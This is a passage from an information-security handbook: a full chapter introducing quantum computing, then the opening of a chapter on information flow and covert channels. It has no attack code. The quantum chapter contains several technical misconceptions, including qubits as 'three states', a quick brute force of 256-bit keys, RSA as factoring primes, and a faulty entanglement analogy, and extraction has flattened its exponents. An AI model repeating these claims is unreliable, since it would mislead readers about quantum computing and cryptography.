Van Oorschot, P. and Wiener, M. (1994) Parallel collision search with application to hash 
functions and discrete logarithms. Proceedings of Second ACM Conference on Computer 
and Communication Security.
Recommended Resources: Organizations
Association of Computing Machinery (ACM): www.acm.org
International Association for Cryptologic Research (IACR): www.iacr.org
NIST Computer Security Resource Center (CSRC): csrc.nist.gov

227
19
Chapter 
Quantum Computing: 
The Rise of the Machine
Robby Fussell
19.1  Introduction
Computers of today are fractions of the size of their first classical developed ances-
tors. Computer chip manufacturers like Intel have developed the ability to place 
Contents
19.1	 Introduction..............................................................................................227
19.2	 Classical Computing versus Quantum Computing.................................. 228
19.2.1	Classical Computing..................................................................... 228
19.2.2	Quantum Computing................................................................... 228
19.2.2.1	Superposition...................................................................229
19.2.2.2	Quantum Parallelism......................................................230
19.3	 Problems and Solutions in Quantum Computing.....................................230
19.3.1	Measurement.................................................................................230
19.3.2	Decoherence..................................................................................231
19.4	 Applications for Quantum Computing.....................................................232
19.4.1	Quantum Encryption....................................................................232
19.4.2	Quantum Neural Networks...........................................................233
19.5	 Future Work..............................................................................................233
19.6	 Conclusion............................................................................................... 234
Acknowledgments..............................................................................................235
References..........................................................................................................235

228  ◾  Information Security Management Handbook
numerous transistors on computer chips, and Intel’s cofounder Gordon Moore 
stated that the numbers of transistors on a computer chip will double every 12 
months.1 There are currently almost 108 numbers of transistors on the Pentium™ 
IV computer chip.1 The reason for this doubling effect is the demand for faster and 
more powerful computers. Transistors are components that are used for on and 
off switching within computer devices. For example, a transistor with an electrical 
charge is said to be in a state of one, and with no electrical charge is said to be in 
a zero state. Classical computers operate on the basis of binary computation. For 
example, a computer uses a number of transistor states of zeros and ones to repre-
sent a base-10 number. Through the use of logic gates, these strings of zeros and 
ones can be manipulated to produce a desired result. The problem that computer 
chip developers are now faced with is the constant reduction in computer chip size. 
The size and number of the transistors placed on computer circuitry is becoming 
close to atomic in scale.2 The problem with this atomic scale is that it is not bound 
by classical physics, but rather quantum physics.
19.2  Classical Computing versus Quantum Computing
To understand what is developing in the area of quantum computing, one must 
realize how quantum theory operates. Explaining quantum physics is beyond the 
scope of this chapter; however, a few key examples will clarify their application to 
quantum computing.
19.2.1  Classical Computing
As mentioned previously, classical computing involves the use of binary manipu-
lation. Using a string of zeros and ones, classical computing can perform various 
operations to produce a needed result. The zero or one representation can also be 
seen as a state. The transistor will either have an electrically charged state equal to 
a binary one or a no-charge state represented as a binary zero. Therefore, classical 
computing operates on a binary standard of zero or one. This imposes a physical 
limitation on classical computing. It has been said that within 20 years, Moore’s 
law will demonstrate the physical limitations for classical computing.2 If current 
technology continues, the miniaturization of computer components will reach a 
limitation where the transistors will act upon a single electron, and for technology 
to go beyond this would require a different approach like quantum computing.3
19.2.2  Quantum Computing
On the other hand, quantum computing operates at the subatomic level, which is 
governed by quantum physics instead of classical physics that regulates classical 
computing. Instead of using transistors, which are close to the atomic scale because 

Quantum Computing: The Rise of the Machine  ◾  229
of Moore’s law,1 scientists are using subatomic particles such as photons and ions. 
One might ask, what is the benefit of using subatomic particles instead of binary 
registers to perform computerized calculations? A quantum bit or qubit2, 4–13 is a 
subatomic particle that represents data instead of the classical binary representa-
tion. The atoms of rubidium and beryllium have been among the most popular for 
quantum computing experiments. Classical binary representation of data can only 
be in one of two states, either a zero or a one, but not both. However, qubits can 
represent data in a state of zero, one, and both zero and one, known as a superposi-
tion state or different states in between.
19.2.2.1  Superposition
Superposition is the main factor of quantum computing that enables it to per-
form significantly better than classical computing. This superposition state is 
accomplished through the subatomic particle’s properties. The qubit is viewed 
as an atom with two electron orbits. One electron orbit can be designated as the 
“zero orbit” and the other electron orbit is considered the one orbit for purposes 
of masking the classical computing binary representation of zero and one. If the 
qubit is to represent a binary one, a laser can be used to excite the initial electron 
state, the zero state, therefore sending the electron into the other orbit, which 
is the one state. It can be observed that the electron’s position in the zero orbit 
places the qubit in a zero state and if the electron is orbiting in the one orbit, it 
is in the one state. Now, if the laser intensity, duration, and wavelength used to 
change the electron’s orbit is halved, the electron will now orbit in both the zero 
and one orbit, placing the qubit into the superposition state where it represents 
both zero and one. This can be demonstrated with an experiment using a light 
source. By sending the light source through a piece of cardboard containing two 
slits, an interference pattern was shown on the screen. When the light source was 
lowered to where it produced only one photon (a single particle of light) at a time, 
the interference pattern was still displayed stating that the photon had to travel 
both paths at the same time.
Now we have a unit that can represent three states, unlike a transistor that 
can only represent one of two states. For example, using a classical computer 
register that contains three physical bits, the register can be in one of eight pos-
sible states at a particular point in time (000, 010, 111, 101, 011, 100, 110, and 
001). However, with a quantum register with three qubits, the register can be in 
all eight states at one time because of superposition. Because one qubit can rep-
resent both and zero and one at the same time, the qubit register can be viewed 
as 2n, where 2 is the number of possible states, one and zero, and n is the num-
ber of qubits. Therefore, the quantum register can be denoted as 2n for a single 
point in time or 23 = 8 states at once. Now, referencing classical computing and 
logic gates, to perform a NOT operation on the eight different register combina-
tions, it would require eight separate execution cycles; however, performing the 

230  ◾  Information Security Management Handbook
same NOT operation on the quantum register would require only one execution 
cycle.5
19.2.2.2  Quantum Parallelism
This is due to quantum parallelism or entanglement-enhanced information process-
ing.2 Entanglement is defined by Rocha, Massad, and Coutinho as “a strong state 
correlation between spatially separated particles.”12 Entanglement suggests that if 
two people were flipping a coin, each coin would randomly land on heads while 
the other lands on tails; however, there will come a time where both coins will both 
land on heads or both will land on tails during the same toss.2 Each coin is said to 
be entangled with the other, meaning they are both forced to have the same state.
The qubits are in a sense operating in parallel because they are in two differ-
ent states at the same time. For this to be accomplished in the classical computing 
environment, parallel processors would have to be deployed. To demonstrate the 
outcome, if a 400 quantum processor computer was built, the classical computing 
equivalent would need 2400 processors running in parallel. As one can see, this is 
not an option for classical computing. As stated by Steane and Rieffel, “quantum 
computing increases exponentially with size.”2
19.3  Problems and Solutions in Quantum Computing
Quantum computing appears to be the “Holy Grail” for resolving the desire for 
enhanced computing; however, quantum computing does have its own issues. 
Measurement and decoherence represent two of the main concerns. However, when it 
comes to measurement, one will see a positive and a negative effect of this process.
19.3.1  Measurement
For quantum computing to work, a measurement must be taken of the qubits to 
obtain the results. The problem with measuring a qubit in a state of superposition 
unfortunately changes the state of the qubit to that of the measuring device or 
mechanism’s single state.13
To provide a better explanation of why measurement changes the state of the 
qubit, Figure 19.1 by Glassner will be referenced. Photons travel through air on a 
wavelength within a plane. That plane can either be vertical, horizontal, or any-
where in between. Looking at Figure 19.1, a laser beam is used to generate the light 
source. If a polarized vertical filter is placed in a position closest to the laser beam 
without the other two filters, the screen in the rear will measure around 50 percent 
of the photons produced by the laser. Next, if the third polarized horizontal filter 
is placed into the laser’s path, the screen will not register any photons. The reason 
for this is because the first polarized filter would reflect or absorb all of the photons 

Quantum Computing: The Rise of the Machine  ◾  231
that have a wavelength other than vertical. The photons only on a vertical plane 
will pass through and will then be reflected or absorbed by the final horizontal 
filter. However, what happens if a 45° angle polarized filter is placed in between 
the vertical and horizontal filters? The screen will show around one eighth of the 
generated light. The reason for this is measurement. The polarized filters act as 
measuring devices; in other words a measurement postulate.7 The vertical filter 
definitely blocks all nonvertical planes. The next 45° angle filter changes the state 
of the vertical plane photons to a 45° angle plane state and finally the horizontal 
filter changes the angle planes to a horizontal plane, which then gets reflected on 
the screen.
Shor and Grover devised two different algorithms to resolve this issue of mea-
surement changing states. As stated by Steane and Rieffel, “Shor’s algorithm mea-
sures a common property of all the output values. Grover’s algorithm amplifies the 
results of interest.”2 So what can be seen here is that a new way of computing must 
be performed. Classical programmers will be required to learn new programming 
techniques in the area of quantum transformations.
19.3.2  Decoherence
Building quantum computers involves one of the most difficult issues of decoher-
ence. Decoherence is the alteration of the quantum state due to exchanges from 
the environment.11 Therefore, to build quantum systems, they must be contained 
and isolated in a way that prevents influences outside the system. Fortunately, the 
answer came from the mathematical world instead of the physical world in the 
form of quantum error correction algorithms.11 The classical error correction meth-
ods utilize the process of redundant bits to check for errors. However, this does 
Laser
Figure 19.1  Measurement of light. From Glassner, A. Quantum computing, Part 
1. IEEE Computer Graphics and Applications, 2001.7 With permission.

232  ◾  Information Security Management Handbook
not work in the quantum realm. First, a quantum state transformation must be 
detected, then it must be determined what transformation state transpired, and 
finally that transformation must be negated.2
19.4  Applications for Quantum Computing
Now that quantum computing has been explained at a high level, what can quan-
tum computing be applied to for its benefit to be realized? Computers are utilized 
by individuals and companies on a daily basis to provide services, communications, 
and information in general. These functions must be secured. Quantum comput-
ing has developed an area in concept known as quantum encryption.10 Also, neural 
networks have stepped into the area of quantum computing.9 With neural net-
works, algorithms have been developed in the classical sense for these networks to 
process data in the most efficient manner. Developers realize that the function of 
the neural network and the amount of data to be processed can be computationally 
intensive; therefore, researchers have noticed the benefits of quantum parallelism 
and have begun developing quantum algorithms for neural networks.
19.4.1  Quantum Encryption
As previously discussed, quantum computing can execute in one cycle what it cur-
rently takes a classical computer to execute in eight cycles when dealing with a 
register with three physical bits. This exponential increase in speed and computa-
tion now places in jeopardy classical encryption schemes, which are built on the 
difficulty of factoring extremely large prime numbers. The time it would take for 
numerous classical systems running in parallel to exhaust all possible 256-bit keys 
for an encrypted message would be infeasible. However, this task could be quickly 
accomplished via a quantum system. Peter Shor at AT&T Bell Labs Research 
developed a quantum algorithm that could be used on a quantum system to find 
conventional encryption keys used for RSA encryption based on factoring in poly-
nomial time.2,9,11,14 These conventional keys thought to be unbreakable could be 
exploited in little time using a quantum system and Shor’s quantum algorithm, 
which exploits this security issue through the use of quantum parallel processing by 
executing in one step what takes classical computing exponential amounts of steps. 
The problem with conventional encryption is that it requires the encryption key to 
be large enough so an exhaustive test of all possible keys would be futile. The next 
problem is trying to exchange session keys securely without interception.
For example, given a scenario where Bob and Alice want to communicate 
securely, they will need to exchange session keys to encrypt and decrypt informa-
tion. The problem with this scenario is that an eavesdropper can easily capture the 
session key and the communicated information. Quantum encryption prevents this 
problem of key exchange. Remember that quantum computing is based on quantum 

Quantum Computing: The Rise of the Machine  ◾  233
physics. Earlier it was stated that the quantum system is comprised of qubits that 
represent classical binary registers, and to perform quantum gates or manipulations 
on the state of a qubit, a laser was utilized to transfer energy to the qubit’s electron, 
transforming it into another orbit; hence, another state. It was also mentioned that a 
problem with quantum systems is susceptibility to outside or environmental noise.
These two statements are the foundation of why quantum key exchange would 
be secure. In a quantum computing environment, when Bob wants to communicate 
securely with Alice, he can send her the quantum key. If an eavesdropper intercepts 
the key, the state of the qubits will change and Alice can confirm with Bob that 
the key she received was indeed intercepted.10 This new development in quantum 
encryption has been tested successfully across optical fiber up to 48 km.2,10 The 
problem with this method of secure channel communication is the length of trans-
mit. Because quantum encryption is governed by quantum laws, amplifying the 
individual qubits en route would alter their quantum state, unlike classical com-
munication amplification. Intermediary endpoint locations along the transmission 
path could be implemented, but would require classical means by decrypting the 
data, then encrypting the data again, and sending it to the next intermediate loca-
tion. This solution has its advantages and disadvantages.
19.4.2  Quantum Neural Networks
Another application for quantum computing is within neural networks.9 Neural 
networks are a branch of study under artificial intelligence where a network is 
constructed to accept certain input and, based on that input and the intelligence 
inherent in the network, produce intelligent output. Large neural networks could 
be constructed to analyze network traffic for security threats or to analyze voice 
communications. The problem in these large-scale implementations is the large 
amounts of data to be analyzed. The method currently implemented to handle this 
large analysis is to execute classical systems in parallel.
Depending on the function of the neural network, the algorithms utilized, and 
the amount of data, the neural network parallel processing would increase in size 
exponentially due to the ever-expanding Internet. For example, neural networks 
can be developed to utilize surrounding environmental data as input and, based 
on its learning algorithms, construct the proper output. The process time cur-
rently needed for a neural network to learn in classical fashion is quite significant. 
Quantum computing with the right quantum algorithms could reduce this time 
significantly. This is a situation where quantum computing could also be a benefit.
19.5  Future Work
The discovery of more quantum algorithms is a major focal point discussed by 
Shor,14 who states that there are different reasons behind the lack of quantum 

234  ◾  Information Security Management Handbook
algorithms. One might be that quantum computing simply has not become the 
norm. Another reason is that researchers are focusing on attempting to solve classi-
cal polynomial-time algorithms in super polynomial-time. According to Shor, this 
approach will not yield new quantum algorithms. Shor suggests that researchers 
spend time searching for quantum algorithms, which can solve classical polyno-
mial-time problems that have already been solved classically.
Another area where quantum computing could be applied is in the area of 
cascading failures in scale-free networks.15 Scale-free networks like the Internet 
and the electrical power grid succumb to what is known as “cascading failures.” 
A cascading failure occurs when a point within the network fails, causing a chain 
reaction of failures across the network. Simulation of a power grid or computer 
network that operates within the quantum realm might provide better insight to 
their behavior as mentioned by Richard Feynman.11
Finally, excellent research has been done in the construction of quantum com-
puting systems like the ion trap and nuclear magnetic resonance (NMR).4,11 The 
ion trap uses ions as the qubits and a laser to perform the quantum manipulations. 
The problem with this type of quantum computing system is the need for it to be 
placed in a vacuum and at particularly low temperatures. The NMR quantum com-
puting system benefits by being able to operate at room temperature; however, this 
quantum system does not scale well. As one can see, research must continue in the 
area of quantum computing to overcome these and other obstacles.
19.6  Conclusion
Moore’s law gives an account of how the progress of computer chip development 
will proceed. By placing more transistors on a computer chip along with the reduc-
tion of its size will eventually scale the computer chip to the subatomic realm. This 
would then change the operation of the computer. It would no longer be bound 
by classical physics, but now of the quantum laws. Because it appears inevitable 
that classical computing is starting to cross over into the quantum world, a new 
machine must now rise up to take its place.
Quantum computing is a fairly new research area that contains much promise. 
Quantum computing is based on the idea that qubits can operate in many different 
states, as opposed to the classical computing of only a zero or one. The quantum 
system’s ability to operate in many states, including different states at the same time 
known as superposition, provides the basis for parallel computing. Parallel comput-
ing shown in theory on quantum systems provides a mechanism to execute in one 
step all possibilities of a problem that would require classical computing systems 
numerous execution steps. This new ability provides a mechanism for factorization 
as developed by Shor.2,11 Another algorithm developed for quantum computing is a 
search algorithm. Although the algorithm is the best developed thus far for quan-
tum computing, it shows progress made in the new field.

Quantum Computing: The Rise of the Machine  ◾  235
The research in quantum computing also has its shortcomings. Measurement 
of qubits causes the qubits to “lock in” on a particular state. This is a drawback 
when trying to observe the outcome for all possible states in a quantum system. 
This is a current research area within quantum computing that is being pursued. 
However, this particular inadequacy with measurement has a positive side effect. 
In the area of computer security, quantum key distribution systems have made sig-
nificant strides in quantum systems. When encrypted communications need to be 
established between two parties, session keys must be distributed to perform secure 
communications. The problem in either the classical computing environment or 
the quantum computing environment involves the disclosure of the session key to 
unwanted individuals known as eavesdroppers.
Referring back to Glassner’s discussion of measurement postulated in Figure 19.1, 
when the angled polarized filter is placed in the path of the laser beam, the photon’s 
states are changed based on sine and cosine probability related to the polarized filter. 
This scenario is used for the exchange of session keys. When the eavesdropper mea-
sures the path of light used to exchange session keys, the eavesdropper will change the 
state of the photon in which the true sender and receiver can verify that someone is 
eavesdropping on the line before any sensitive information is transmitted.
Indeed, some interesting developments in quantum computing have been 
reached along with promise in other areas such as cryptography and quantum neu-
ral networks. Quantum computing is going to be the next step for computing 
technology. Other areas that quantum computing might be able to benefit is that of 
chaos theory. Chaos theory providing ways of predicting supposed random events 
could use quantum computing possibly to enhance the predictions or the length 
of predictions. Another possibility is the butterfly effect in chaos theory like that 
of cascading failures could be modeled or simulated for predictable outcomes and 
predictions because all states of the quantum system can be realized.
Acknowledgments
This work was provided for the Special Topics in Information Security Management 
course at Nova Southeastern University. I would like to thank God, the speakers, 
and the professor for the presentations and insight on the topics concerning infor-
mation security management.
References
	
1.	Cannady, D.J. DCIS 790 Special Topics in Information Security Management Slides. 
Class slides from Nova Southeastern University, Graduate School of Information 
Sciences WebCT site http://www.nova.edu/webct/index.html. Accessed September 
10, 2004.

236  ◾  Information Security Management Handbook
	
2.	Steane, A.M. and Rieffel, E.G. Beyond bits: the future of quantum information pro-
cessing. Computer, 2000.
	
3.	Horgan, J. The end of science revisited. Computer, 2004.
	
4.	Biham, E., Brassard, G., Kenigsberg, D., and Mor, T. Quantum computing without 
entanglement. Theoretical Computer Science, 2004.
	
5.	Calude, C.S., Dinneen, M.J., and Svozil, K. Reflections on quantum computing. 
Complexity, 2001.
	
6.	Copsey, D., Oskin, M., Metodiev, T., Chong, F.T., Chuang, I., and Kubiatowicz, J. The 
effect of communication costs in solid-state quantum computing architectures, in ACM 
Symposium on Parallel Algorithms and Architectures, San Diego, 2003, ACM Press, New 
York.
	
7.	Glassner, A. Quantum computing, Part 1. IEEE Computer Graphics and Applications, 
2001.
	
8.	Glassner, A. Quantum computing, Part 2. IEEE Computer Graphics and Applications, 
2001.
	
9.	Gupta, S. and Zia, R.K.P. Quantum neural networks. Journal of Computer and System 
Sciences, 2001, 355–383.
	 10.	Hurwitz, M.V., Quantum “encryption,” in Proceedings of the Tenth Conference on 
Computers, Freedom and Privacy: Challenging the Assumptions, Toronto, 2000, ACM 
Press, New York, 303–313.
	 11.	Rieffel, E. and Polak, W. An introduction to quantum computing for non-physicists. 
ACM Computing Surveys, 2000, 36.
	 12.	Rocha, A.F., Massad, E., and Coutinho, F.A.B. Can the human brain do quantum 
computing? Medical Hypotheses, 2004.
	 13.	Wright, M.A. The impact of quantum computing on cryptography. Network Security, 
2000.
	 14.	Shor, P.W. Why haven’t more quantum algorithms been found? Journal of the ACM, 
2003, 87–90.
	 15.	Barabasi, A.-L. (2003) Linked. New York: Penguin Group.

6
SECURITY 
ARCHITECTURE 
and DESIGN


239
20
Chapter 
Information Flow and 
Covert Channels
Sean M. Price
Contents
20.1	 Introduction.............................................................................................240
20.2	 Conceptual Overview..............................................................................240
20.3	 Information Assurance.............................................................................241
20.4	 Data Lineage............................................................................................243
20.5	 Tracking Information Flows................................................................... 244
20.6	 Flows within a System..............................................................................247
20.7	 Complications..........................................................................................250
20.8	 Attack Methods.......................................................................................252
20.9	 Selecting Countermeasures......................................................................255
20.9.1	 Data............................................................................................256
20.9.2	 Subjects......................................................................................258
20.9.3	 Information Flows..................................................................... 260
20.9.4	 Security Services.........................................................................261
20.9.5	 Countermeasures........................................................................263
20.10	Emerging and Potential Techniques.........................................................270
20.11	Covert Channels......................................................................................273
20.11.1	Attacks........................................................................................274
20.11.2	Observable Properties.................................................................275
20.11.3	Defenses.....................................................................................276
20.12	Summary.................................................................................................278
References..........................................................................................................279

240  ◾  Information Security Management Handbook
20.1  Introduction
Information is the essence of IT systems. Most modern systems exist primarily to 
store, process, and share information. We consider information flow to include the 
aforementioned activities associated with information. These activities can be highly 
dynamic and complex. Some of the information flowing within an IT system requires 
appropriate security measures and controls. Information security practitioners must 
understand the dynamic nature of information flows within a system to be able to 
determine if the appropriate controls are in place and functioning as intended.
Understanding information flow paths is an important aspect of information 
assurance (IA). The overall goal of an IA program is to ensure that appropriate con-
trols are in place to protect a system and its information. When actual and theoreti-
cal information flow paths are identified, then it becomes possible to identify the 
associated threats. Knowing the flow of information is also essential when evaluat-
ing newly discovered vulnerabilities and their potential impact on the information. 
Knowledge of the path of information as well as the associated threats and vulner-
abilities provides the capability to assess the risk for each path. This provides infor-
mation and system owners with the ability to select the most appropriate controls to 
counteract the identified risk. Thus, the selection of controls can be weighed against 
risk and cost associated with a control. Finally, the identification of information 
flows within a system aids the continuous monitoring process which might identify 
information flows that are new, unintended, or are unauthorized.
Data can be defined as individual elements that comprise information. The 
differences between data and information are sometimes ambiguous. What is 
data for one person or group may be information for yet another. Therefore, we 
will consider the terms “data” and “information” to be interchangeable in this 
chapter.
20.2  Conceptual Overview
In the context of this chapter, information flow is defined as the movement of 
information at the micro and macro levels. Micro-level movements of informa-
tion include all aspects of information access within a computer, including system 
calls, file system actions, as well as data input and output. Macro-level movements 
involve intrasystem and intersystem movements. Intrasystem movements include 
information flows between workstations and servers on an organizational system. 
Intersystem movements involve the flow of information between organizations, 
such as sending an e-mail from an organization’s system to that of its customer.
The classical view of computing consists of input, processing, memory, local 
storage, and output. Figure 20.1 provides a graphical image of the classical view. 
Information flows from input, such as a keyboard, into the central processor. Inside 
the processor, information is acted upon through slice-of-time increments that 

Information Flow and Covert Channels  ◾  241
handle information for various tasks. This involves frequent exchanges and refresh-
ing of information between the processor and memory. Occasionally, information 
is also communicated between the processor and local storage. At some point, 
information is ready for output. The processor pushes information to the appropri-
ate output devices such as monitors and printers. This view of a computer system 
provides a high-level understanding of its basic functions and the fundamental 
paths for information to flow.
The emergence of distributed computing and the client/server paradigm com-
plicates information flows. Information may exist in different states on multiple 
machines simultaneously. We can see in Figure  20.2 that the classical view is 
expanded to incorporate communication aspects allowing information to flow 
through other devices and systems. The advent of communication interfaces 
expands the number of possible routes for information to travel. Inputs, outputs, 
storage, and other processors are available through the communications interface. 
Information may now exist in multiple states and at multiple locations. Establishing 
assurance for the information flow at each point becomes a significant challenge.
20.3  Information Assurance
Information exists in three possible states according to the IA model (Maconachy 
et al. 2001): storage, processing, and transmission. Each state is best understood by 
assuming each represents a potential location for information. In this regard, stor-
age refers to a static location such as fixed or removable media. Processing includes 
information that resides in memory or the CPU. We note that transmission is 
the location of information in a communication path such as network media. 
Output
Local
Storage
Processor
Input
Memory
Figure 20.1  Classical computing view.

242  ◾  Information Security Management Handbook
Information could reside in any one or all three states. For example, a word pro-
cessing document in the storage state could be stored on a hard drive or on remov-
able media. The same document could be opened for editing, which exemplifies the 
processing state, while maintaining the storage state. Finally, the opened document 
could be sent to a colleague via e-mail, which would cause it to enter the transmis-
sion state. Protecting information in each of these states may require the use of 
different countermeasures.
The IA model identifies five security services: confidentiality, integrity, avail-
ability, authentication, and nonrepudiation. Confidentiality protects informa-
tion from unauthorized disclosure. Integrity is used to protect information from 
unauthorized modification or destruction. Availability ensures resources can 
be accessed when needed. Authentication identifies the validity of a message, a 
transmission, or an originator. Nonrepudiation provides proof that precludes a 
sender or recipient from denying not having processed a message. In this chapter, 
we will focus our attention on the first three security services and refer to them 
jointly as “CIA.”
Models are a useful technique to explain information flow in a system. In this 
respect, we may consider the movement of information from one place to another 
to represent a change of state in the system. Computer scientists consider finite 
state autonoma (FSA) an empirical means to evaluate state changes. This view of 
information flow provides a formal (mathematical) means to represent information 
Other Output
Local
Storage
Other
Storage
Processor
Memory
Other
Comm. Interface
Communication
Interface
Storage
Other Input
Output
Input
Input
Output
Other
Processor
Memory
Figure 20.2  Expanded computing view.

Information Flow and Covert Channels  ◾  243
flows. This provides the computer scientist with the means to evaluate informa-
tion flow through the use of mathematical proofs. FSA proofs can be very com-
plex to construct, but when done correctly, have the ability to properly analyze 
state changes to information. Rather than rely upon FSA, security practitioners 
embrace more informal views of information flow through frameworks such as the 
IA model. This chapter will make use of the informal attributes of the IA model to 
make observations and draw conclusions.
20.4  Data Lineage
Most information has a lineage, i.e., some information is derived from a collection 
of sources. One document may include information that is replicated from other 
documents, reports, or raw data. Some researchers also refer to this concept as data 
provenance (Bose 2002). Knowing the origination of information is very important 
in some communities. For instance, the scientific community must know where 
certain data is derived from so they can accurately interpret results of their experi-
ments. Many organizations also face this issue when they simply want to identify 
document versions in a collaboration environment. This situation has given rise to 
a plethora of document management solutions. As opposed to the use of expensive 
tools, a simple process for implementing version control that achieves a similar 
effect has been proposed by Price (2007). However, these solutions do not always 
provide exact details of who changed what and from where the information might 
have been derived.
Tracking information lineage can be a daunting task. Figure 20.3 is an example 
of information lineage as it flows from one file into another. Given files A through 
H in the figure, let us assume that the information in files A, B, D, and E are 
mutually exclusive of each other. Note in the figure that an arrow from one file to 
the next represents a one-way flow of information. We will also assume that any 
new file may contain original information exclusive of the information flowing 
into it. We can, therefore, interpret that file C is derived from files A and B. It is 
also conceivable that file C contains original information not found in files A or 
B. When we consider file F, it is apparent that it contains information from files 
C and E, but it is not immediately apparent whether it contains flows from files A 
and B. File G contains information from files D and F, but it is difficult to know 
whether information flowed into it from files A, B, or C. File H is derived from F. 
Because we may not know exactly what information flowed from file F into files 
G and H, it is problematic to say that G and H are mutually exclusive or that they 
are related. Both situations are possible. Files G and H can be mutually exclusive if 
each file is derived from different parts of file H, which do not have overlapping lin-
eage from files A, B, C, and E. If any information from files A, B, C, E, or F exists 
in both files G and H, then they will not be mutually exclusive, but rather have a 
relation to each other and a similar lineage. Considering the scenario exhibited in 

244  ◾  Information Security Management Handbook
Figure 20.3, the difficulty in assessing data lineage as it relates to information flows 
is apparent.
The diagram in Figure 20.3 is a simplistic representation of information flow. 
However, it does not consider more common and complicated scenarios that are 
likely to occur in the real world. Information flow can take compound and circular 
routes. Consider the data flow depicted in Figure 20.4. Information is flowing from 
file D directly into file G. It is also possible that information is flowing from file 
D into file G via files C and F. This depicts a compound information flow because 
information in a file may emerge from a root source over multiple routes. Another 
possibility is that information may flow circularly between files as can be seen 
between files C and F. The same information may flow between these files, which 
may frustrate attempts to determine where an aspect of information originated. 
We also note that it is possible now for file C to have data flowing into it from file 
E from file F. Thus, information lineage and the identification of data flows can be 
further complicated when compound and circular routes are present.
20.5  Tracking Information Flows
Knowing information flows helps to identify violations of separation of duties 
or least privilege. Consider the information flow depicted in Figure 20.5. In this 
Figure 20.3  Information lineage.

Information Flow and Covert Channels  ◾  245
Figure 20.4  Complex data flow.
Figure 20.5  Data flows and users.

246  ◾  Information Security Management Handbook
figure, we have users 1, 2, and 3. We assume the duties of users 1 and 3 are mutu-
ally exclusive. User 3 depends on some information from user 1 to accomplish their 
duties. Information not explicitly shared should not be readable by other users. Files 
completely within the area of a user are not shared between users. At the discretion 
of a user, information within a nonshared file may flow to those that are shared. 
For example, user 3 has complete control over files G and H. Files on the broken 
line are shared between users. For instance, files D and F are shared between users 
2 and 3. If we were implementing DAC, we might say that user 2 has the right to 
modify file D while user 3 should only have the capability to read it. The arrows 
indicate the authorized flow of information from one file to the next. However, it is 
important to note that this does not mean that all information must flow from one 
file to the next. For instance, not all information from file A needs to flow to file C. 
It is up to the discretion of user 1 to determine what information must flow from 
file A to file C and still not violate least privilege or separation of duties.
Now suppose that the access controls on the shared files allow read and write 
privileges to those who are authorized access. A situation may arise similar to that 
depicted in Figure 20.6. This figure demonstrates a breakdown in least privilege 
and separation of duties due to inappropriate information flows. We can see that 
information is now allowed to flow from file G to D. Assuming user 2 is not autho-
rized access to this information we have a situation where least privilege is violated. 
Now suppose user 2 copies this information from file D to C. This also violates least 
Figure 20.6  Data flow violations.

Information Flow and Covert Channels  ◾  247
privilege because user 1 now has unauthorized access to the copied information. If 
this information has the potential to allow user 1 to perpetrate a fraud, then we will 
also realize a violation of separation of duties. This scenario demonstrates a method 
by which inappropriate flows of information can cause violations to the concepts of 
least privilege and separation of duties. If the authorized paths of information flow 
are known, then it would be possible to identify these potential or actual violations 
due to the inappropriate access controls.
20.6  Flows within a System
Information flow within an operating system does not flow immediately from one 
point to another as depicted in Figure 20.1. Information is often handled by a vari-
ety of execution threads as it travels from one point to another. Figure 20.7 depicts 
a high-level overview of some of these interactions as they might be observed in 
an operating system such as Microsoft® Windows® XP. Operating systems of this 
type enable separation between user and kernel activities. The kernel implements 
services for user applications such as interfaces for input, output, and storage. It also 
provides mechanisms for processes to communicate with each other as well as with 
those on other systems. Figure 20.7 extends the basic elements seen in Figure 20.2 

User Process #1
User Process #2
Messaging
System
Call #1
System
Call #2
System
Call #3
System
Call #4
User Mode    
Kernel Mode
Inter-process
Communication
Device
Driver
Device
Driver
Device
Driver
Device
Driver
Input
Storage
Communications
Output
Figure 20.7  Operating system information flows.

248  ◾  Information Security Management Handbook
by providing more fundamental detail on how information flows in the system. It 
is evident from Figure 20.7 that information flow can have multiple intermediate 
handling points in a system.
Each of the intermediate points seen in Figure 20.7 enables specialized han-
dling of information. Device drivers are the interfaces between hardware and 
software. They ensure that information flows correctly between the device and the 
operating system. Most device drivers execute in kernel mode and are controlled 
by the operating system. System calls are functions provided by the operating 
system that are made available for user processes and other kernel threads. System 
calls are usually intermediate communications between a thread, device drivers, 
and other threads. When a process makes a system call, it typically causes infor-
mation to flow. Examples of information flow-related system calls include read-
ing a file, writing a file to storage, sending data to a printer or the network, and 
interprocess communication.
Perhaps the most powerful aspect of modern operating systems is their ability 
to allow separate threads of execution to communicate. This ability is what provides 
most of the rich system capabilities users experience when they interact with a 
modern IT system. Enormous amounts of information flow between communicat-
ing processes and threads. Allowing individual processes to communicate enables 
the sharing of tasks and information. As such, work can be spread out among sev-
eral processes. This sharing of information and work is an essential aspect of what 
enables rapid software development through reusable code. Some processes are 
dedicated to a particular task and handle specific types of information. Processes 
dedicated to a particular task provide a service to other processes, which shortens 
development cycles. This provides efficiency to software development efforts. The 
ability of processes to participate in information flow is a fundamental aspect of 
modern operating systems.
Within modern Windows operating systems, there are principally two services 
that allow processes to communicate: the Windows messaging subsystem and 
interprocess communication (IPC). Windows messaging is essentially a service 
available to all processes executing in the context of the user interacting at the con-
sole. This service allows threads, or more generally windows, to send messages back 
and forth. Some of the types of messages sent through Windows messaging include 
keystrokes, commands to close a window, terminate requests, and window resizing. 
The Windows messaging system also provides a way to pass data between threads. 
In contrast, IPC allows communication between processes that are not executing 
in the same context. Thus, a user process can communicate with other processes at 
the kernel level or even on a physically separate machine. IPC provides the ability 
for processes to communicate by using a particular protocol or service. Some of the 
more common IPC protocols include pipes, mail slots, remote procedure calls, and 
sockets. The Windows clipboard is an example of an IPC service. Windows mes-
saging and IPC are backbone services for information flow between local processes 
as well as intrasystem and intersystem processes.

Information Flow and Covert Channels  ◾  249
The emergence of reusable code, system services, IPC, and publication of APIs 
by product vendors enables an open architecture system. Reusable code shortens 
development life cycles and allows more effort to be put into new concepts as 
opposed to recreating the previous functionality. Most of the reusable code is pack-
aged as statically or dynamically linked libraries. System services might be viewed 
as reusable processes. As opposed to sharing libraries, a service provides a way to 
share information processing power and perform tasks on behalf of other processes. 
We can consider IPC an important conduit for information flow between pro-
cesses. APIs are the glue facilitating an open architecture system. Through an API, 
vendors publish the functions, methods, events, and data structures that are related 
to their proprietary libraries and services. Developers use published and proprietary 
APIs to send data and make requests between processes. Published APIs allow the 
sharing and reuse of proprietary code. Within an open architecture, APIs are the 
essential element facilitating the flow of information between processes.
We can see the various points in Figure 20.7 that handle and process informa-
tion as it flows through the system. For instance, information traveling through the 
